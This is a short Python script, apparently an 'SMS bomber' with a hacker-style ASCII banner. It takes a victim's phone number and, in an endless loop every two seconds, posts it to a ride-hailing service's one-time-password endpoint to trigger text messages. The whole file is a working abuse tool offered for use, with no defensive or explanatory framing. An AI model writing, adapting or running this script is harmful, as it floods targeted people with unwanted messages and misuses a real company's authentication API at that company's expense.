from colorama import *
import requests
import time 
init(autoreset=True)
print(Fore.GREEN + """
__  __ ____     _   _ _   _ _  ___   _  _____        ___   _
|  \/  |  _ \   | | | | \ | | |/ / \ | |/ _ \ \      / / \ | |
| |\/| | |_) |  | | | |  \| | ' /|  \| | | | \ \ /\ / /|  \| |
| |  | |  _ <   | |_| | |\  | . \| |\  | |_| |\ V  V / | |\  |
|_|  |_|_| \_\___\___/|_| \_|_|\_\_| \_|\___/  \_/\_/  |_| \_|
""")
print(Fore.RED + 've1.0.0.1')
input = input(Fore.YELLOW + "Enter Number phone >>>  ")
url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
while True:
 	time.sleep(2)
 	data = {"cellphone": input}
 	u = requests.post(url, data=data)
 	print(u.status_code, Fore.GREEN + 'SEND SMS')
